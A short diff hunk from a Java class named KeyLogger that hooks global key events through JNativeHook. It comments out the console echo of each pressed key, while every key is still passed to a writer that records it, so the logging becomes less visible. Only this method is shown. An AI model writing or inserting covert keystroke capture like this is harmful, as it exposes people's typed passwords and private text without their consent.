@@ -34,7 +34,7 @@ public class KeyLogger implements NativeKeyListener {
      */
     @Override
     public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {
-        System.out.println(NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode()) + " pressed");
+        //System.out.println(NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode()) + " pressed");
         kpWriter.writeKeyPress(NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode()));
     }
 
